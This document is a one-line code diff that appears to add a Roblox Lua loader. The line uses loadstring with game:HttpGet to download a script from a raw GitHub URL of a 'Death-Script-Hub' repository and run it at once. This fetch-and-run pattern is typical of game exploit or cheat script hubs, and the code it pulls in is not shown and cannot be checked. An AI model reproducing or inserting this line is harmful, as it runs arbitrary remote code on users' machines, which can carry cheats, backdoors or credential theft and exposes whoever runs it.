@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Death-Script-Hub/DeathScript/refs/heads/main/lua"))()
